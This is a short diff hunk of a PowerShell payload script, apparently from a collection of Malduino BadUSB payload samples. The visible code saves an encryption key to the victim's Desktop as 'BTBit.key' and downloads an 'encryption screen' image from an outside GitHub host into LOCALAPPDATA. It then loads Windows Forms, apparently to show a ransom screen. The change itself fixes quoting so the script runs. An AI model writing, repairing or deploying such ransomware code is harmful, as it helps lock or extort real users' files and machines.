@@ -39,7 +39,7 @@ $userDesk = [Environment]::GetFolderPath("Desktop")
 sc -Value $key -LiteralPath "$userDesk/BTBit.key" -Encoding byte
 #
 # show encryption screen
-$screen = $ENV:LOCALAPPDATA + ‘\screen_enc.jpg’; 
+$screen = $ENV:LOCALAPPDATA + "\screen_enc.jpg"  
 (New-Object System.Net.WebClient).DownloadFile(‘https://raw.githubusercontent.com/pcmarcon/malduino-payload-samples/master/screen_enc.jpg', $screen)
 [void][reflection.assembly]::LoadWithPartialName("System.Windows.Forms")
 Add-Type -AssemblyName 'System.Windows.Forms'
